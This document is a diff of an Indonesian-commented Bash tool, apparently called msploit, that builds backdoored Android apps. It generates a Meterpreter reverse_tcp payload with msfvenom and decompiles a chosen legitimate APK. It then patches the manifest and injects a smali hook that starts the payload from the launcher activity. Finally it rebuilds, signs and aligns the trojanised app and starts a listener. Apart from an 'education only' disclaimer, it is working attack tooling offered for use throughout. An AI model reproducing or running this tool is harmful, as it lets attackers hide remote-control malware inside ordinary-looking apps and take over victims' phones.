@@ -1,9 +1,12 @@
-#!/bin/bash
-#fix create payload manual msfvenom
-#apt-get install lib32stdc++6 lib32ncurses6 lib32z1++ -y
-# installing apktool 2.6.1
-# check requirements
-
+# !/bin/bash
+# code by K1M4K-ID
+# ./msploit adalah sebuah tools adaptasi dari evil-droid. khusus pengguna nethunter mobile
+# jika device mu menggunakan desktop gunakan script GreenHatArsenal-Toolkit
+# source : https://github.com/K1M4K-ID/GreenHatArsenal-Toolkit
+# gunakan script ini dengan bijak, jangan gunakan tools ini untuk melakukan tindak kejahatan
+# author tidak akan bertanggung jawab atas perbuatan kalian.!!
+# gunakan tools ini untuk edukasi.. atau pendidikan semata.! semoga tools ini dapat membantu!
+# code warna
 RED="$(printf '\033[31m')"
 GREEN="$(printf '\033[32m')"
 ORANGE="$(printf '\033[33m')"
@@ -16,13 +19,13 @@ BLACKBG="$(printf '\033[40m')"
 RESETFG="$(printf '\e033[0m')"
 RESETBG="$(printf '\e[0m\n')"
 YELLOW="$(printf '\e[1;33m')"
-
-
-
+# config ip address
+eth0_ip=$(ifconfig eth0 | grep "inet" | awk 'NR == 1 {print $2}')
+wlan0_ip=$(ifconfig wlan0 | grep "inet" | awk 'NR == 1 {print $2}')
+# patch directory saat ini
 path=$(pwd)
-
+# logo
 function baner() {
-
 cat <<- EOF
  ${GREEN}__    __     ______     ______   __         ______     __     ______  
 /\ "-./  \   /\  ___\   /\  == \ /\ \       /\  __ \   /\ \   /\__  _\ 
@@ -41,114 +44,66 @@ ${WHITE} \ \_\ \ \_\  \/\_____\  \ \_\    \ \_____\  \ \_____\  \ \_\    \ \_\
 EOF
   #statements
 }
-
-
-spinLoader() {
-    pid=$!
-    spin='\|/-'
-    i=0
-    while kill -0 $pid 2>/dev/null; do
-        i=$(( (i+1) %4 ))
-        printf "\r${BLUE}[${spin:$i:1}]${RESTORE} $PROG_MESSAGE"
-        sleep .1
-    done
-    printf "\r ${GREEN}[-]${RESTORE} $COMP_MESSAGE"
-    sleep 1;echo java_V=$(java -version 2>&1 | awk 'NR == 1 { gsub("\"",""); print $3}' | awk -F. '{print $1"."$2}')
-
-}
+# check folder malware jika ada maka akan sleep 1 menit
+if [ -d "Malware" ];
+then
+	sleep 0.1
+else
+	mkdir -p Malware
+fi
+# bersih layar dan tampilkan banner
 clear
 baner
 printf "\033[31;1m[\033[34;1m*\033[31;1m]\033[37;1m please wait . . . .\n\n"
-
-
-
+# input aplikasi yang ingin di injeksi
 function xyz()
 {
- read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] patch aplikasi : "'\033[34;1m')" aps
+ read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] patch aplikasi>"'\033[34;1m')" aps
 }
+# setup ip,nama,
 function sets_apsinal(){
         clear
         baner
         printf '\033[31;1m'
         echo
         printf "\033[37;1m[\033[32;1m*\033[37;1m] sekarang masukan ip untuk backdoor anda\033[31;1m\n"
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
-        echo
-        ifconfig eth0|grep "inet"|awk 'NR == 1 {print $2}'
-        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
-        echo
-        ifconfig wlan0|grep "inet"|awk 'NR == 1 {print $2}'
-        echo
-        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1m$eth0_ip\033[37;1m)\033[31;1m\n"
+        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1m$wlan0_ip\033[37;1m)\033[31;1m\n"
+        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] lhost>"'\033[34;1m')" lh
         printf '\033[31;1m'
-        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
+        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] lport>"'\033[34;1m')" lp
         printf '\033[31;1m'
-        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] nama backdoor  : "'\033[34;1m')" nama
+        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] output[example:fbmod]>"'\033[34;1m')" nama
         printf '\033[31;1m'
         printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . . please wait\033[31;1m\n"
         printf '\033[31;1m\n'
 }
-
+# buat inject payload method baru... tidak semua bisa!
 function inject_payloads(){
         msfvenom -x $aps -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/$nama.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
         echo
 }
-
+# buat payload
 function inject_payload(){
         msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
         echo
 }
-
-
+# listerner
 function listener_kali(){
         clear
         baner
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] masukan config portmap..\033[31;1m\n"
-	sleep 5
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1m$eth0_ip\033[37;1m)\033[31;1m\n"
+        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1m$wlan0_ip\033[37;1m)\033[31;1m\n"
+        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] lhost>"'\033[34;1m')" lh
         printf '\033[31;1m'
-        echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] sekarang masukan ip listener anda\033[31;1m\n"
-        sleep 0.025
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
-        echo
-        ifconfig eth0|grep "inet"|awk 'NR == 1 {print $2}'
-        echo
-        sleep 0.025
-        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
-        echo
-        sleep 0.025
-        ifconfig wlan0|grep "inet"|awk 'NR == 1 {print $2}'
-        echo
-        sleep 0.025
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] forward ip address anda, tun0(\033[31;1mforward\033[37;1m)\n"
+        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] lport>"'\033[34;1m')" lp
         printf '\033[31;1m'
-        echo
-        sleep 0.025
-        ifconfig tun0|grep "inet"|awk 'NR == 1 {print $2}'
-        echo
-        sleep 0.025
-        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
-        printf '\033[31;1m'
-        echo
-        sleep 0.025
-        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
-        printf '\033[31;1m'
-        echo
-        sleep 0.025
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] starting apache2 && database (\033[32;1mruning\033[37;1m)\n"
-        printf '\033[31;1m'
-        sleep 0.025
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] apache server\033[31;1m [\033[32;1mOK\033[31;1m]\n"
-        echo
-        sleep 0.025
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] postgresql\033[31;1m   [\033[32;1mOK\033[31;1m]\n"
-        echo
-        sleep 0.025
+        sleep 1
         printf "\033[37;1m[\033[32;1m*\033[37;1m] starting metasploit listener . . .\033[31;1m\n"
         sleep 2
         clear
 }
-
+# menu listernet
 function listerners(){
     clear
     baner
@@ -158,7 +113,7 @@ function listerners(){
     sleep 0.025
     printf "\033[31;1m[\033[32;1mx\033[31;1m] \033[37;1mexit\033[31;1m\n\n"
     sleep 0.025
-    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice>"'\033[34;1m')" xyz
     sleep 0.025
     printf '\033[31;1m'
     echo
@@ -185,37 +140,26 @@ function listerners(){
 
 	fi
 }
-
-
 # decompyle payload
 #
 function decompile_payload(){
         printf "\033[37;1m[\033[32;1m*\033[37;1m] decompile payload.apk\033[31;1m\n"
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-	echo
          apktool d -f $path/payload.apk
-	echo
 }
-
 # decompile apsinal
 #
 function decompile_apsinal(){
         printf "\033[37;1m[\033[32;1m*\033[37;1m] decompile $aps\033[31;1m\n"
-	echo
          apktool d -f -o $path/apsinal $aps
-	echo
 }
-
 # rebuild payload apsinal
 #
 function rebuild_apsinal(){
 	printf '\033[31;1m'
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild backdoor please wait\033[31;1m\n"
-	echo
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild backdoor please wait..\033[31;1m\n"
          apktool b $path/apsinal -o ori.apk
-	echo
 }
-
 # add permission dan hook
 #
 function perms()
@@ -245,7 +189,6 @@ function perms()
  sed -i "s|$amanifest|$boot_cmp|g" $path/apsinal/AndroidManifest.xml 2>&1
  android_nam=$tmp
 }
-
 # functions hook smali
 #
 function hook_smalies()
@@ -256,17 +199,17 @@ function hook_smalies()
  android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/apsinal/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
  if [ $android_name ]; then
   printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
-  printf "\033[37;1minject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
+  printf "\033[37;1minject Smali>$android_name.smali" |awk -F ":/" '{ print $NF }'
   hook_num=`grep -n "    return-void" $path/apsinal/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
-  printf "\033[37;1mbaris ke : $hook_num \n"
+  printf "\033[37;1mbaris ke>$hook_num \n"
   printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
   starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
   sed -i "${hook_num}i\ ${starter}" $path/apsinal/smali/$android_name.smali > /dev/null 2>&1
  elif [ ! -e $android_activity ]; then
   printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
-  printf "\033[37;1minject Smali : $android_activity.smali" |awk -F ":/" '{ print $NF }'
+  printf "\033[37;1minject Smali>$android_activity.smali" |awk -F ":/" '{ print $NF }'
   hook_num=`grep -n "    return-void" $path/apsinal/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
-  printf "\033[37;1mbaris ke : $hook_num \n"
+  printf "\033[37;1mbaris ke>$hook_num \n"
   printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
   starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
   sed -i "${hook_num}i\ ${starter}" $path/apsinal/smali/$android_activity.smali > /dev/null 2>&1
@@ -274,27 +217,25 @@ function hook_smalies()
   if [ $rc != 0 ]; then
     printf '\033[31;1m'
     
-    printf "\n\033[37;1m[\033[31;1mx\033[37;1m] tidak ditemukan : $android_activity.smali\n"
+    printf "\n\033[37;1m[\033[31;1mx\033[37;1m] tidak ditemukan>$android_activity.smali\n"
     printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba lagi . . .\033[31;1m\n"
     
     sleep 2
     echo
     printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
-    printf "\033[37;1minject Smali : $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
+    printf "\033[37;1minject Smali>$android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
     hook_num=`grep -n "    return-void" $path/apsinal/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
-    printf "\033[37;1mbaris ke : $hook_num \n"
+    printf "\033[37;1mbaris ke>$hook_num \n"
     printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
     starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
     sed -i "${hook_num}i\ ${starter}" $path/apsinal/smali/$android_targetActivity.smali > /dev/null 2>&1
   fi
  fi
 }
-
-#
+# hapus sampah..
 function clear_data(){
         rm -fr ori.apk payload payload.apk apsinal && mv $nama.apk Malware
 }
-
 # sign backdoor file manual inject
 #
 function sign_aps(){
@@ -312,11 +253,11 @@ fi
         printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba memverifikasi aplikasi backdoor anda, please wait\033[31;1m\n"
         jarsigner -verify -verbose -certs ori.apk.apk > /dev/null 2>&1
         printf "\033[37;1m[\033[32;1m*\033[37;1m] mengkompilasi ulang aplikasi\033[31;1m\n"
-        zipalign 4 ori.apk $nama.apk > /dev/null 2>&1
+        zipalign -p 4 ori.apk $nama.apk > /dev/null 2>&1
+        zipalign -c 4 $nama.apk > /dev/null 2>&1
         printf "\033[37;1m[\033[32;1m*\033[37;1m] verifikasi aplikasi backdoor anda,\033[32;1m succesfully\033[31;1m\n"
 }
-
-
+# runer program
 function backdoor_file(){
         sets_apsinal
         inject_payload
@@ -333,7 +274,7 @@ function backdoor_file(){
         clear_data
         sleep 1
 }
-
+# start program
 function run(){
 sets_apsinal
 xyz
@@ -341,7 +282,7 @@ inject_payloads
 read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] ENTER TO CONTINUE "'\033[34;1m')" lan
 listerners
 }
-
+# recomendasi inject backdoor V.2
 function menu(){
     clear
     baner
@@ -351,16 +292,13 @@ function menu(){
     sleep 0.025
     printf "\033[31;1m[\033[32;1mX\033[31;1m] \033[37;1mexit\033[31;1m\n\n"
     sleep 0.025
-    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice>"'\033[34;1m')" xyz
     sleep 0.025
     printf '\033[31;1m'
     echo
     if [ $xyz = "1"  ];
     then
-    run
-    #listener_kali
-	#msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $lh;set LPORT $lp;exploit;"
-	#clear
+	run
 	listerners
 
     elif [ $xyz = "2"  ];
@@ -382,5 +320,4 @@ function menu(){
 
 	fi
 }
-
 menu
